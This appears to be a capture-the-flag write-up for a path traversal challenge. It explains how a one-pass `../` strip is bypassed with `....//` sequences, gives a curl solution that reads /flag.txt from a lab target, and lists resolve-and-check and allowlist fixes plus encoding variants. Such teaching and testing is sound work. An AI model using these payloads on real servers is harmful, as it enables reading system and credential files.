# Path Traversal — DocsViewer

A doc viewer that joins `?file=<name>` to `/var/www/docs/` after
"sanitising" it with a single `.replace('../', '')` pass.

`.replace()` scans left-to-right exactly once. Stacked-overlap
forms like `....//` collapse back to `../` after a single pass —
because the inner `../` is the substring that gets stripped, and
the outer characters re-merge into a fresh `../`.

## Player target

Read `/flag.txt`.

## Author solution

```bash
# /var/www/docs is the root. Three levels up reaches /.
curl -s 'http://target:5000/view?file=....//....//....//flag.txt'
# CTF{REDACTED}
```

Trace:

```
input         ....//....//....//flag.txt
.replace pass ../../../flag.txt
os.path.join  /var/www/docs/../../../flag.txt
              -> /flag.txt
```

## Why this is the lesson

* **Strip-loops are not normalisation.** The correct check is to
  resolve the joined path with `os.path.realpath()` (or
  `Path.resolve()`) and verify the result is still inside the
  intended root prefix. Anything else is guessing.

  ```python
  full = (DOCS_ROOT / Path(name)).resolve()
  if not full.is_relative_to(DOCS_ROOT.resolve()):
      abort(400)
  ```

* **Use an allowlist when the universe is finite.** If you only
  serve three doc pages, validate `name in {"welcome.md",
  "getting-started.md", "changelog.md"}` and reject everything
  else.

* **Don't trust URL decoding to be one-shot.** Real-world variants
  of this bug include double-URL-encoding (`..%252f`), UTF-8
  overlong encoding, and Windows-style `..\..` separators on
  POSIX servers using `os.path.join`.
